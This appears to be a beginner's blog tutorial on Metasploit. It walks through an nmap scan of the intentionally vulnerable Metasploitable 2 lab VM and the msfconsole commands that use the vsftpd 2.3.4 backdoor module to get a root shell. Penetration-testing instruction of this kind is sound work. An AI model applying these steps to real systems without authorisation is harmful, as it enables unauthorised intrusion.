---
title: "Metasploit Part 2: How to use Metasploit?"
date: 2019-01-05 13:30:30
tags:
  - Metasploit
---
In [Part 1](/why-metasploit/) of this series, we saw why we need Metasploit. In this post let us see the usage of it.

I am using Kali Linux. Kali has Metasploit pre-installed. If you are using any other operating system, you can google for Metasploit installation instructions for your operating system. 

So fire up the terminal and enter msfconsole
![msfconsole](https://i.imgur.com/fSHoC4p.png)

We can see the beautiful banner and version of the Metasploit framework. There are 1807 exploits and  539 payloads. 

Once in msfconsole, we need to
1. Search for exploits
2. Use the exploit
3. Set the options for the exploit
4. Set the Payload (if not set, default payload will be selected)
5. exploit

I downloaded the [Metasploitable 2 VM](https://sourceforge.net/projects/metasploitable/) and opened it in VMware Fusion 11.

A simple nmap scan reported the following services as open
![nmap](https://i.imgur.com/kvVfCxh.png)

Let's start with the first result of nmap. We got vsftpd 2.3.4 open on PORT 21. Let's do a google search for vsftpd 2.3.4
![vsftpd](https://i.imgur.com/ZvX1aWa.png)

So we found that a vulnerability exists with vsftpd 2.3.4. So now is the time to search for any exploits already available in Metasploit framework.

### Search for exploits
```sh
search vsftpd 2.3.4
```
![search](https://i.imgur.com/Lb0MFmq.png)
There are 2 exploits available. I am interested in backdoor command execution.

### Use the exploit
```sh
use exploit/unix/ftp/vsftpd_234_backdoor
```
![use](https://i.imgur.com/pOi1QIh.png)

### Set the options for the exploit
```sh
set RHOST 192.168.36.130
```
![set](https://i.imgur.com/6vsi4T2.png)

### Exploit
![exploit](https://i.imgur.com/FycZynd.png)

We got the shell with root access of the VM by exploiting the vulnerability in vsftpd 2.3.4

Did you observe? we did not mention anything about payloads and exploited the system. Because Metasploit selected default payload for this exploit. What if we want to select the payload? We will see that in the next post.
